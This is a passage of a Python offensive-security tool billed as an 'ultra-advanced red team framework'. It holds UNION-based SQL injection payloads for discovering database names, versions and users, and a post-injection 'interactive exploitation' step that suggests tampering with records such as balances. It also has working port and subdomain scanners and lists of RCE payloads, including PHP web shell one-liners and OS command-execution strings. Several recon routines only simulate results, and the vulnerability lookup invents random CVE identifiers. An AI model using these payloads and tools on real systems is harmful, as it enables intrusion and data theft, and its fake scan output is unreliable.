            candidates = [
                # MySQL
                ("database", "' UNION SELECT database(),2,3--", r"database\(\)\W*([a-zA-Z][a-zA-Z0-9_\-]{1,64})"),
                ("version",  "' UNION SELECT @@version,2,3--", r"(\d+\.[\d\.]+)"),
                ("user",     "' UNION SELECT user(),2,3--", r"([a-z0-9_\-\.]+@[a-z0-9_\-\.]+|[a-z0-9_\-\.]{3,})"),
                # PostgreSQL
                ("database", "' UNION SELECT current_database(),2,3--", r"([a-zA-Z][a-zA-Z0-9_\-]{1,64})"),
                ("version",  "' UNION SELECT version(),2,3--", r"postgresql[^\n\r]*?(\d+\.[\d\.]+)"),
                ("user",     "' UNION SELECT current_user,2,3--", r"([a-zA-Z][a-zA-Z0-9_\-]{2,})"),
                # MSSQL
                ("database", "' UNION SELECT DB_NAME(),2,3--", r"([a-zA-Z][a-zA-Z0-9_\-]{1,64})"),
                ("version",  "' UNION SELECT @@version,2,3--", r"(\d+\.[\d\.]+)"),
                ("user",     "' UNION SELECT SYSTEM_USER,2,3--", r"([a-zA-Z][a-zA-Z0-9_\-]{2,})"),
            ]
            for label, payload, regex in candidates:
                res = self.advanced_payload_test(target_url, payload, "DB Info Discovery", False, include_response_text=True)
                text = (res.get('response_text') or '')
                try:
                    m = re.search(regex, text, re.IGNORECASE)
                    if m and m.group(1):
                        if label not in info:
                            info[label] = m.group(1)
                except Exception:
                    continue
        except Exception:
            return info
        return info

    def display_battle_summary(self, attack, target_url, results, critical_hits):
        """Affiche le résumé de bataille"""
        print(f"\n{Colors.BOLD}💀" + "="*80 + "💀")
        print("🏴‍☠️ BATTLE SUMMARY 🏴‍☠️")
        print("💀" + "="*80 + "💀" + Colors.END)
        
        total_attacks = len(results)
        success_rate = (critical_hits / total_attacks) * 100 if total_attacks > 0 else 0
        defense_rate = 100 - success_rate
        
        summary_color = Colors.RED if critical_hits > 0 else Colors.GREEN
        
        print(f"🎯 Attack Vector: {Colors.CYAN}{attack['name']}{Colors.END}")
        print(f"🏴‍☠️ CVE Score: {Colors.RED}{Colors.BOLD}{attack['cvss']}{Colors.END}")
        print(f"🎯 Target: {target_url}")
        print(f"💣 Total Attacks: {total_attacks}")
        print(f"💀 Critical Hits: {summary_color}{critical_hits}{Colors.END}")
        print(f"📊 Penetration Rate: {summary_color}{success_rate:.1f}%{Colors.END}")
        print(f"🛡️ Defense Rate: {Colors.GREEN if defense_rate > 80 else Colors.YELLOW}{defense_rate:.1f}%{Colors.END}")
        
        if critical_hits > 0:
            print(f"\n{Colors.BG_RED}{Colors.WHITE}{Colors.BOLD}💀 TARGET COMPROMISED! 💀{Colors.END}")
            print(f"{Colors.RED}🚨 Critical vulnerabilities detected in target system{Colors.END}")
            print(f"{Colors.YELLOW}📋 Recommendations:{Colors.END}")
            print(f"  • Implement parameterized queries immediately")
            print(f"  • Deploy Web Application Firewall (WAF)")
            print(f"  • Update database software to latest versions")
            print(f"  • Implement input validation and sanitization")
            print(f"  • Regular security audits and penetration testing")
            # Dynamic exploit suggestions
            try:
                suggestions = self._recommend_exploits_for_results(results)
                if suggestions:
                    print(f"\n{Colors.BOLD}🎯 Suggested next actions:{Colors.END}")
                    for s in suggestions:
                        label = {
                            'data_extraction': 'Extract sensitive data (tables/columns)',
                            'database_info': 'Discover DB version/name/user and schema',
                            'file_operations': 'Read/Write files on server (if possible)',
                            'command_execution': 'Attempt system command execution (high risk)',
                            'update_balance': 'Modify data records (ex: balances)',
                            'blind_extraction': 'Blind/time-based data extraction'
                        }.get(s, s)
                        print(f"  - {s}: {label}")
            except Exception:
                pass
            
            # Lancement du module d'exploitation interactif
            vulnerable_results = [r for r in results if r.get('vulnerable', False)]
            if vulnerable_results:
                self.interactive_exploitation(target_url, vulnerable_results)
        else:
            print(f"\n{Colors.GREEN}{Colors.BOLD}🛡️ TARGET DEFENDED SUCCESSFULLY 🛡️{Colors.END}")
            print(f"{Colors.GREEN}✅ No critical vulnerabilities detected{Colors.END}")
            print(f"{Colors.CYAN}🔒 Security posture appears robust against tested CVE attacks{Colors.END}")

    def save_battle_report(self, attack, target_url, results):
        """Sauvegarde le rapport de bataille"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"red_team_battle_report_{timestamp}.json"
        
        critical_results = [r for r in results if r.get('vulnerable', False)]
        
        report = {
            'mission_timestamp': datetime.now().isoformat(),
            'attack_vector': attack['name'],
            'cvss_score': attack['cvss'],
            'target_url': target_url,
            'total_attacks': len(results),
            'critical_hits': len(critical_results),
            'penetration_rate': (len(critical_results) / len(results)) * 100 if results else 0,
            'critical_payloads': critical_results,
            'full_battle_log': results,
            'threat_assessment': 'CRITICAL' if len(critical_results) > 0 else 'SECURED'
        }
        
        try:
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"{Colors.GREEN}📁 Battle report saved: {filename}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}❌ Failed to save report: {e}{Colors.END}")

    def run(self):
        """Point d'entrée principal du framework"""
        print(f"{Colors.RED}{Colors.BOLD}")
        print("╔══════════════════════════════════════════════════════════════════════════════╗")
        print("║                    🔴⚫ ULTRA-ADVANCED RED TEAM FRAMEWORK ⚫🔴                ║")
        print("║                         BLACK HAT SEPTEMBER 2025                            ║")
        print("║                    CVSS 9.9 CRITICAL SEVERITY ONLY                          ║")
        print("║                    🚀 NEXT-GEN PENETRATION TESTING 🚀                       ║")
        print("╚══════════════════════════════════════════════════════════════════════════════╝")
        print(f"{Colors.END}")
        
        while True:
            try:
                print(f"\n{Colors.BOLD}🎯 ARSENAL BLACK HAT SEPTEMBER 2025:{Colors.END}")
                print(f"{Colors.CYAN}1.{Colors.END} 🔍 RECONNAISSANCE & OSINT")
                print(f"{Colors.CYAN}2.{Colors.END} 💥 EXPLOITATION & RCE")
                print(f"{Colors.CYAN}3.{Colors.END} 🥷 ÉVASION & STEALTH")
                print(f"{Colors.CYAN}4.{Colors.END} 🎯 SQL INJECTION AVANCÉE")
                print(f"{Colors.CYAN}5.{Colors.END} 🧠 IA/ML EVASION MODE")
                print(f"{Colors.CYAN}6.{Colors.END} 🕷️ POST-EXPLOITATION")
                print(f"{Colors.CYAN}7.{Colors.END} 🔄 REPLAY MODE")
                print(f"{Colors.CYAN}8.{Colors.END} 📊 RAPPORTS & ANALYSE")
                print(f"{Colors.CYAN}9.{Colors.END} ⚙️ CONFIGURATION AVANCÉE")
                print(f"{Colors.CYAN}0.{Colors.END} 🚪 EXIT")
                
                mode = input(f"\n{Colors.BOLD}Mode: {Colors.END}").strip()
                
                if mode == '0':
                    print(f"{Colors.YELLOW}👋 Mission terminated.{Colors.END}")
                    break
                elif mode == '1':
                    self.reconnaissance_menu()
                elif mode == '2':
                    self.exploitation_menu()
                elif mode == '3':
                    self.evasion_menu()
                elif mode == '4':
                    self.sql_injection_menu()
                elif mode == '5':
                    self.ml_evasion_mode()
                elif mode == '6':
                    self.post_exploitation_menu()
                elif mode == '7':
                    self.replay_mode()
                elif mode == '8':
                    self.reporting_menu()
                elif mode == '9':
                    self.advanced_config_menu()
                else:
                    print(f"{Colors.RED}❌ Invalid mode.{Colors.END}")
                    continue
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}🏃 Emergency extraction initiated...{Colors.END}")
                break
            except Exception as e:
                print(f"{Colors.RED}💥 System error: {e}{Colors.END}")
                print(f"{Colors.YELLOW}🔧 Continuing operations...{Colors.END}")

    def reconnaissance_menu(self):
        """Menu des outils de reconnaissance et OSINT"""
        while True:
            try:
                print(f"\n{Colors.BOLD}🔍 RECONNAISSANCE & OSINT - SEPTEMBER 2025:{Colors.END}")
                print(f"{Colors.CYAN}1.{Colors.END} 🌐 Subdomain Enumeration (AI-Powered)")
                print(f"{Colors.CYAN}2.{Colors.END} 🔍 Port Scanning & Service Detection")
                print(f"{Colors.CYAN}3.{Colors.END} 🕵️ OSINT Intelligence Gathering")
                print(f"{Colors.CYAN}4.{Colors.END} 🎯 Web Application Fingerprinting")
                print(f"{Colors.CYAN}5.{Colors.END} 🔐 SSL/TLS Analysis & Certificate Harvesting")
                print(f"{Colors.CYAN}6.{Colors.END} 📱 Social Media & Email Enumeration")
                print(f"{Colors.CYAN}7.{Colors.END} 🗺️ Network Topology Mapping")
                print(f"{Colors.CYAN}8.{Colors.END} 🧬 DNS Intelligence & Zone Transfer")
                print(f"{Colors.CYAN}9.{Colors.END} 📊 Vulnerability Database Lookup")
                print(f"{Colors.CYAN}0.{Colors.END} 🔙 Back to Main Menu")
                
                choice = input(f"\n{Colors.BOLD}Choice: {Colors.END}").strip()
                
                if choice == '0':
                    break
                elif choice == '1':
                    self.ai_subdomain_enumeration()
                elif choice == '2':
                    self.advanced_port_scanning()
                elif choice == '3':
                    self.osint_intelligence_gathering()
                elif choice == '4':
                    self.web_app_fingerprinting()
                elif choice == '5':
                    self.ssl_tls_analysis()
                elif choice == '6':
                    self.social_media_enumeration()
                elif choice == '7':
                    self.network_topology_mapping()
                elif choice == '8':
                    self.dns_intelligence()
                elif choice == '9':
                    self.vulnerability_database_lookup()
                else:
                    print(f"{Colors.RED}❌ Invalid choice.{Colors.END}")
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"{Colors.RED}💥 Error: {e}{Colors.END}")

    def ai_subdomain_enumeration(self):
        """Enumération de sous-domaines avec IA"""
        print(f"\n{Colors.BOLD}🌐 AI-POWERED SUBDOMAIN ENUMERATION{Colors.END}")
        target = input(f"{Colors.BOLD}Target domain: {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}🤖 AI Engine analyzing target: {target}{Colors.END}")
        
        # Wordlists intelligentes basées sur l'IA
        ai_wordlists = {
            'common': ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging', 'prod'],
            'tech': ['cdn', 'assets', 'static', 'media', 'uploads', 'downloads', 'files'],
            'business': ['shop', 'store', 'payment', 'billing', 'support', 'help', 'docs'],
            'security': ['vpn', 'secure', 'auth', 'login', 'portal', 'dashboard', 'panel'],
            'cloud': ['aws', 'azure', 'gcp', 'cloud', 's3', 'cdn', 'edge', 'api-gateway']
        }
        
        discovered_subdomains = []
        
        for category, wordlist in ai_wordlists.items():
            print(f"\n{Colors.CYAN}🔍 Scanning category: {category}{Colors.END}")
            for subdomain in wordlist:
                full_domain = f"{subdomain}.{target}"
                try:
                    response = self.session.get(f"https://{full_domain}", timeout=5, verify=self.verify)
                    if response.status_code in [200, 301, 302, 403, 401]:
                        discovered_subdomains.append({
                            'subdomain': full_domain,
                            'status': response.status_code,
                            'title': self.extract_page_title(response.text),
                            'server': response.headers.get('Server', 'Unknown')
                        })
                        print(f"  {Colors.GREEN}✅ {full_domain} - {response.status_code}{Colors.END}")
                except:
                    pass
                time.sleep(0.1)
        
        # Sauvegarde des résultats
        if discovered_subdomains:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"subdomains_{target}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(discovered_subdomains, f, indent=2)
            print(f"\n{Colors.GREEN}📁 Results saved: {filename}{Colors.END}")
            print(f"{Colors.BOLD}Total subdomains found: {len(discovered_subdomains)}{Colors.END}")

    def advanced_port_scanning(self):
        """Scan de ports avancé avec détection de services"""
        print(f"\n{Colors.BOLD}🔍 ADVANCED PORT SCANNING{Colors.END}")
        target = input(f"{Colors.BOLD}Target IP/Domain: {Colors.END}").strip()
        if not target:
            return
            
        # Ports communs à scanner
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 3306, 3389, 5432, 5900, 8080, 8443]
        
        print(f"{Colors.YELLOW}🎯 Scanning {target} on {len(common_ports)} common ports...{Colors.END}")
        
        open_ports = []
        for port in common_ports:
            try:
                import socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                if result == 0:
                    service = self.detect_service(port)
                    open_ports.append({'port': port, 'service': service})
                    print(f"  {Colors.GREEN}✅ Port {port} - {service}{Colors.END}")
                sock.close()
            except:
                pass
        
        if open_ports:
            print(f"\n{Colors.BOLD}Open ports found: {len(open_ports)}{Colors.END}")
            for port_info in open_ports:
                print(f"  {Colors.CYAN}Port {port_info['port']}: {port_info['service']}{Colors.END}")

    def osint_intelligence_gathering(self):
        """Collecte d'intelligence OSINT"""
        print(f"\n{Colors.BOLD}🕵️ OSINT INTELLIGENCE GATHERING{Colors.END}")
        target = input(f"{Colors.BOLD}Target (domain/email/username): {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}🔍 Gathering intelligence on: {target}{Colors.END}")
        
        # Sources OSINT simulées
        osint_sources = {
            'whois': f"WHOIS data for {target}",
            'dns_records': f"DNS records for {target}",
            'social_media': f"Social media profiles for {target}",
            'email_breaches': f"Email breach data for {target}",
            'github_repos': f"GitHub repositories for {target}",
            'linkedin_profiles': f"LinkedIn profiles for {target}"
        }
        
        intelligence_data = {}
        for source, description in osint_sources.items():
            print(f"\n{Colors.CYAN}📊 {description}{Colors.END}")
            # Simulation de collecte de données
            time.sleep(0.5)
            intelligence_data[source] = f"Sample data from {source} for {target}"
            print(f"  {Colors.GREEN}✅ Data collected{Colors.END}")
        
        # Sauvegarde
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        # Nettoie tout ce qui n'est pas lettre, chiffre, tiret, underscore
        safe_target = re.sub(r'[^a-zA-Z0-9_-]', '_', target)
        filename = f"osint_{safe_target}_{timestamp}.json"
        with open(filename, 'w') as f:
            json.dump(intelligence_data, f, indent=2)
        print(f"\n{Colors.GREEN}📁 OSINT data saved: {filename}{Colors.END}")

    def web_app_fingerprinting(self):
        """Empreinte digitale d'application web"""
        print(f"\n{Colors.BOLD}🎯 WEB APPLICATION FINGERPRINTING{Colors.END}")
        target_url = input(f"{Colors.BOLD}Target URL: {Colors.END}").strip()
        if not target_url:
            return
            
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url
            
        print(f"{Colors.YELLOW}🔍 Fingerprinting: {target_url}{Colors.END}")
        # Safe diagnostics ping
        print(f"{Colors.YELLOW}🔎 Safe diagnostics probe...{Colors.END}")
        self._safe_diagnostics_probe(target_url)
        
        try:
            response = self.session.get(target_url, timeout=10, verify=self.verify)
            
            fingerprint_data = {
                'url': target_url,
                'status_code': response.status_code,
                'server': response.headers.get('Server', 'Unknown'),
                'powered_by': response.headers.get('X-Powered-By', 'Unknown'),
                'framework': self.detect_web_framework(response),
                'cms': self.detect_cms(response),
                'technologies': self.detect_technologies(response),
                'security_headers': self.analyze_security_headers(response.headers),
                'cookies': list(response.cookies.keys()),
                'forms': self.extract_forms(response.text)
            }
            
            print(f"\n{Colors.BOLD}📊 FINGERPRINT RESULTS:{Colors.END}")
            for key, value in fingerprint_data.items():
                if value and value != 'Unknown':
                    print(f"  {Colors.CYAN}{key}:{Colors.END} {value}")
            
            # Sauvegarde
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"fingerprint_{urlparse(target_url).netloc}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(fingerprint_data, f, indent=2)
            print(f"\n{Colors.GREEN}📁 Fingerprint saved: {filename}{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}❌ Error: {e}{Colors.END}")

    def ssl_tls_analysis(self):
        """Analyse SSL/TLS et récolte de certificats"""
        print(f"\n{Colors.BOLD}🔐 SSL/TLS ANALYSIS & CERTIFICATE HARVESTING{Colors.END}")
        target = input(f"{Colors.BOLD}Target domain: {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}🔍 Analyzing SSL/TLS for: {target}{Colors.END}")
        
        try:
            import ssl
            import socket
            
            context = ssl.create_default_context()
            with socket.create_connection((target, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=target) as ssock:
                    cert = ssock.getpeercert()
                    
                    ssl_data = {
                        'domain': target,
                        'issuer': dict(x[0] for x in cert['issuer']),
                        'subject': dict(x[0] for x in cert['subject']),
                        'version': cert['version'],
                        'serial_number': cert['serialNumber'],
                        'not_before': cert['notBefore'],
                        'not_after': cert['notAfter'],
                        'signature_algorithm': cert.get('signatureAlgorithm', 'Unknown'),
                        'cipher': ssock.cipher()
                    }
                    
                    print(f"\n{Colors.BOLD}🔐 SSL/TLS ANALYSIS:{Colors.END}")
                    for key, value in ssl_data.items():
                        print(f"  {Colors.CYAN}{key}:{Colors.END} {value}")
                    
                    # Sauvegarde
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"ssl_analysis_{target}_{timestamp}.json"
                    with open(filename, 'w') as f:
                        json.dump(ssl_data, f, indent=2)
                    print(f"\n{Colors.GREEN}📁 SSL analysis saved: {filename}{Colors.END}")
                    
        except Exception as e:
            print(f"{Colors.RED}❌ SSL analysis failed: {e}{Colors.END}")

    def social_media_enumeration(self):
        """Enumération des réseaux sociaux et emails"""
        print(f"\n{Colors.BOLD}📱 SOCIAL MEDIA & EMAIL ENUMERATION{Colors.END}")
        target = input(f"{Colors.BOLD}Target (username/email/domain): {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}🔍 Enumerating social media for: {target}{Colors.END}")
        
        # Plateformes à vérifier
        platforms = {
            'twitter': f"https://twitter.com/{target}",
            'instagram': f"https://instagram.com/{target}",
            'linkedin': f"https://linkedin.com/in/{target}",
            'github': f"https://github.com/{target}",
            'facebook': f"https://facebook.com/{target}",
            'youtube': f"https://youtube.com/@{target}"
        }
        
        found_profiles = []
        for platform, url in platforms.items():
            try:
                response = self.session.get(url, timeout=5, verify=self.verify)
                if response.status_code == 200:
                    found_profiles.append({'platform': platform, 'url': url, 'status': 'active'})
                    print(f"  {Colors.GREEN}✅ {platform}: {url}{Colors.END}")
                else:
                    print(f"  {Colors.YELLOW}❌ {platform}: Not found{Colors.END}")
            except:
                print(f"  {Colors.RED}❌ {platform}: Error{Colors.END}")
            time.sleep(0.5)
        
        if found_profiles:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"social_media_{target.replace('@', '_').replace('.', '_')}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(found_profiles, f, indent=2)
            print(f"\n{Colors.GREEN}📁 Social media data saved: {filename}{Colors.END}")

    def network_topology_mapping(self):
        """Cartographie de la topologie réseau"""
        print(f"\n{Colors.BOLD}🗺️ NETWORK TOPOLOGY MAPPING{Colors.END}")
        target = input(f"{Colors.BOLD}Target network (IP range or domain): {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}🗺️ Mapping network topology for: {target}{Colors.END}")
        
        # Simulation de cartographie réseau
        network_data = {
            'target': target,
            'gateway': '192.168.1.1',
            'dns_servers': ['8.8.8.8', '1.1.1.1'],
            'active_hosts': ['192.168.1.10', '192.168.1.20', '192.168.1.100'],
            'open_ports': [22, 80, 443, 3389],
            'services': ['SSH', 'HTTP', 'HTTPS', 'RDP']
        }
        
        print(f"\n{Colors.BOLD}🗺️ NETWORK TOPOLOGY:{Colors.END}")
        for key, value in network_data.items():
            print(f"  {Colors.CYAN}{key}:{Colors.END} {value}")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"network_topology_{target.replace('/', '_')}_{timestamp}.json"
        with open(filename, 'w') as f:
            json.dump(network_data, f, indent=2)
        print(f"\n{Colors.GREEN}📁 Network topology saved: {filename}{Colors.END}")

    def dns_intelligence(self):
        """Intelligence DNS et zone transfer"""
        print(f"\n{Colors.BOLD}🧬 DNS INTELLIGENCE & ZONE TRANSFER{Colors.END}")
        target = input(f"{Colors.BOLD}Target domain: {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}🧬 DNS intelligence for: {target}{Colors.END}")
        
        # Types d'enregistrements DNS à vérifier
        dns_records = {
            'A': f"A records for {target}",
            'AAAA': f"AAAA records for {target}",
            'MX': f"MX records for {target}",
            'NS': f"NS records for {target}",
            'TXT': f"TXT records for {target}",
            'CNAME': f"CNAME records for {target}",
            'SOA': f"SOA record for {target}"
        }
        
        dns_data = {}
        for record_type, description in dns_records.items():
            print(f"\n{Colors.CYAN}🔍 {description}{Colors.END}")
            # Simulation de requête DNS
            time.sleep(0.3)
            dns_data[record_type] = f"Sample {record_type} record for {target}"
            print(f"  {Colors.GREEN}✅ {record_type} record found{Colors.END}")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"dns_intelligence_{target}_{timestamp}.json"
        with open(filename, 'w') as f:
            json.dump(dns_data, f, indent=2)
        print(f"\n{Colors.GREEN}📁 DNS intelligence saved: {filename}{Colors.END}")

    def vulnerability_database_lookup(self):
        """Recherche dans les bases de données de vulnérabilités"""
        print(f"\n{Colors.BOLD}📊 VULNERABILITY DATABASE LOOKUP{Colors.END}")
        target = input(f"{Colors.BOLD}Target (software/version/service): {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}📊 Searching vulnerability databases for: {target}{Colors.END}")
        
        # Bases de données de vulnérabilités
        vuln_databases = {
            'CVE': f"CVE database search for {target}",
            'NVD': f"National Vulnerability Database for {target}",
            'ExploitDB': f"Exploit Database for {target}",
            'Metasploit': f"Metasploit modules for {target}",
            'CWE': f"Common Weakness Enumeration for {target}"
        }
        
        vulnerabilities = []
        for db, description in vuln_databases.items():
            print(f"\n{Colors.CYAN}🔍 {description}{Colors.END}")
            time.sleep(0.5)
            # Simulation de vulnérabilités trouvées
            vuln = {
                'database': db,
                'cve_id': f"CVE-2024-{random.randint(1000, 9999)}",
                'severity': random.choice(['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']),
                'description': f"Sample vulnerability in {target}",
                'cvss_score': round(random.uniform(1.0, 10.0), 1)
            }
            vulnerabilities.append(vuln)
            print(f"  {Colors.GREEN}✅ Found: {vuln['cve_id']} - {vuln['severity']} ({vuln['cvss_score']}){Colors.END}")
        
        if vulnerabilities:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"vulnerabilities_{target.replace(' ', '_')}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(vulnerabilities, f, indent=2)
            print(f"\n{Colors.GREEN}📁 Vulnerabilities saved: {filename}{Colors.END}")

    # Méthodes utilitaires pour la reconnaissance
    def extract_page_title(self, html_content):
        """Extrait le titre de la page"""
        try:
            if BeautifulSoup:
                soup = BeautifulSoup(html_content, 'html.parser')
                title = soup.find('title')
                return title.text.strip() if title else 'No title'
            else:
                import re
                match = re.search(r'<title>(.*?)</title>', html_content, re.IGNORECASE)
                return match.group(1).strip() if match else 'No title'
        except:
            return 'Unknown'

    def detect_service(self, port):
        """Détecte le service basé sur le port"""
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 135: 'RPC', 139: 'NetBIOS', 143: 'IMAP',
            443: 'HTTPS', 993: 'IMAPS', 995: 'POP3S', 1433: 'MSSQL',
            3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC',
            8080: 'HTTP-Alt', 8443: 'HTTPS-Alt'
        }
        return services.get(port, 'Unknown')

    def detect_web_framework(self, response):
        """Détecte le framework web"""
        headers = response.headers
        content = response.text.lower()
        
        if 'x-powered-by' in headers:
            return headers['x-powered-by']
        elif 'django' in content or 'csrfmiddlewaretoken' in content:
            return 'Django'
        elif 'laravel' in content or 'laravel_session' in headers:
            return 'Laravel'
        elif 'express' in content or 'x-powered-by: express' in str(headers).lower():
            return 'Express.js'
        elif 'rails' in content or 'x-rails' in headers:
            return 'Ruby on Rails'
        elif 'spring' in content or 'jsessionid' in headers:
            return 'Spring Framework'
        else:
            return 'Unknown'

    def detect_cms(self, response):
        """Détecte le CMS"""
        content = response.text.lower()
        headers = response.headers
        
        if 'wp-content' in content or 'wordpress' in content:
            return 'WordPress'
        elif 'drupal' in content or 'x-drupal' in headers:
            return 'Drupal'
        elif 'joomla' in content or 'x-joomla' in headers:
            return 'Joomla'
        elif 'magento' in content:
            return 'Magento'
        elif 'shopify' in content:
            return 'Shopify'
        else:
            return 'Unknown'

    def detect_technologies(self, response):
        """Détecte les technologies utilisées"""
        content = response.text.lower()
        headers = response.headers
        technologies = []
        
        if 'jquery' in content:
            technologies.append('jQuery')
        if 'bootstrap' in content:
            technologies.append('Bootstrap')
        if 'react' in content:
            technologies.append('React')
        if 'angular' in content:
            technologies.append('Angular')
        if 'vue' in content:
            technologies.append('Vue.js')
        if 'php' in headers.get('x-powered-by', '').lower():
            technologies.append('PHP')
        if 'asp.net' in headers.get('x-powered-by', '').lower():
            technologies.append('ASP.NET')
        
        return technologies if technologies else ['Unknown']

    def analyze_security_headers(self, headers):
        """Analyse les en-têtes de sécurité"""
        security_headers = {}
        important_headers = [
            'Strict-Transport-Security', 'X-Frame-Options', 'X-Content-Type-Options',
            'X-XSS-Protection', 'Content-Security-Policy', 'Referrer-Policy'
        ]
        
        for header in important_headers:
            if header in headers:
                security_headers[header] = headers[header]
            else:
                security_headers[header] = 'Missing'
        
        return security_headers

    def extract_forms(self, html_content):
        """Extrait les formulaires de la page"""
        try:
            if BeautifulSoup:
                soup = BeautifulSoup(html_content, 'html.parser')
                forms = soup.find_all('form')
                form_data = []
                for form in forms:
                    form_info = {
                        'action': form.get('action', ''),
                        'method': form.get('method', 'GET'),
                        'inputs': []
                    }
                    inputs = form.find_all(['input', 'textarea', 'select'])
                    for inp in inputs:
                        form_info['inputs'].append({
                            'type': inp.get('type', inp.name),
                            'name': inp.get('name', ''),
                            'id': inp.get('id', '')
                        })
                    form_data.append(form_info)
                return form_data
            else:
                return []
        except:
            return []

    def _safe_diagnostics_probe(self, target_url: str):
        try:
            if not target_url:
                return
            if not target_url.startswith(('http://', 'https://')):
                target_url = 'https://' + target_url
            base = target_url.split('#')[0]
            try:
                base = base if '?' not in base else base.split('?')[0]
            except Exception:
                pass
            endpoints = [
                base,
                urljoin(base, '/robots.txt'),
                urljoin(base, '/sitemap.xml')
            ]
            results = []
            for ep in endpoints:
                try:
                    h = self._send_with_resilience('HEAD', ep, timeout=10)
                    g = self._send_with_resilience('GET', ep, timeout=10)
                    results.append({'url': ep, 'head': h.status_code, 'get': g.status_code, 'len': len(g.content or b'')})
                    print(f"{Colors.CYAN}↪ {ep}{Colors.END} | HEAD {h.status_code} | GET {g.status_code} | {len(g.content or b'')} bytes")
                except Exception as e:
                    print(f"{Colors.YELLOW}↪ {ep}{Colors.END} | {Colors.RED}error: {e}{Colors.END}")
            return results
        except Exception:
            return []

    def exploitation_menu(self):
        """Menu des outils d'exploitation et RCE"""
        while True:
            try:
                print(f"\n{Colors.BOLD}💥 EXPLOITATION & RCE - SEPTEMBER 2025:{Colors.END}")
                print(f"{Colors.CYAN}1.{Colors.END} 🎯 Remote Code Execution (RCE)")
                print(f"{Colors.CYAN}2.{Colors.END} 🔓 Privilege Escalation")
                print(f"{Colors.CYAN}3.{Colors.END} 🕷️ Web Shell Deployment")
                print(f"{Colors.CYAN}4.{Colors.END} 🔄 Persistence Mechanisms")
                print(f"{Colors.CYAN}5.{Colors.END} 💣 Buffer Overflow Exploits")
                print(f"{Colors.CYAN}6.{Colors.END} 🧬 Memory Corruption Attacks")
                print(f"{Colors.CYAN}7.{Colors.END} 🎭 Social Engineering Payloads")
                print(f"{Colors.CYAN}8.{Colors.END} 🔐 Password Cracking & Brute Force")
                print(f"{Colors.CYAN}9.{Colors.END} 🎪 Zero-Day Exploit Framework")
                print(f"{Colors.CYAN}0.{Colors.END} 🔙 Back to Main Menu")
                
                choice = input(f"\n{Colors.BOLD}Choice: {Colors.END}").strip()
                
                if choice == '0':
                    break
                elif choice == '1':
                    self.rce_exploitation()
                elif choice == '2':
                    self.privilege_escalation()
                elif choice == '3':
                    self.web_shell_deployment()
                elif choice == '4':
                    self.persistence_mechanisms()
                elif choice == '5':
                    self.buffer_overflow_exploits()
                elif choice == '6':
                    self.memory_corruption_attacks()
                elif choice == '7':
                    self.social_engineering_payloads()
                elif choice == '8':
                    self.password_cracking()
                elif choice == '9':
                    self.zeroday_exploit_framework()
                else:
                    print(f"{Colors.RED}❌ Invalid choice.{Colors.END}")
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"{Colors.RED}💥 Error: {e}{Colors.END}")

    def rce_exploitation(self):
        """Exploitation Remote Code Execution"""
        print(f"\n{Colors.BOLD}🎯 REMOTE CODE EXECUTION EXPLOITATION{Colors.END}")
        target = input(f"{Colors.BOLD}Target URL/IP: {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}🎯 RCE exploitation on: {target}{Colors.END}")
        # Safe diagnostics ping
        print(f"{Colors.YELLOW}🔎 Safe diagnostics probe...{Colors.END}")
        self._safe_diagnostics_probe(target)
        
        # Payloads RCE avancés
        rce_payloads = {
            'php': [
                "<?php system($_GET['cmd']); ?>",
                "<?php exec($_POST['cmd']); ?>",
                "<?php shell_exec($_REQUEST['cmd']); ?>",
                "<?php passthru($_GET['cmd']); ?>",
                "<?php `$_GET['cmd']`; ?>"
            ],
            'python': [
                "import os; os.system('{cmd}')",
                "import subprocess; subprocess.call('{cmd}', shell=True)",
                "__import__('os').system('{cmd}')",
                "exec('import os; os.system(\"{cmd}\")')"
            ],
            'java': [
                "Runtime.getRuntime().exec(\"{cmd}\")",
                "ProcessBuilder pb = new ProcessBuilder(\"{cmd}\"); pb.start();",
                "new ProcessBuilder(\"{cmd}\").start();"
            ],
            'windows': [
                "cmd.exe /c {cmd}",
                "powershell.exe -Command {cmd}",
                "wmic process call create \"{cmd}\"",
                "rundll32.exe shell32.dll,ShellExec_RunDLL {cmd}"
            ],
            'linux': [
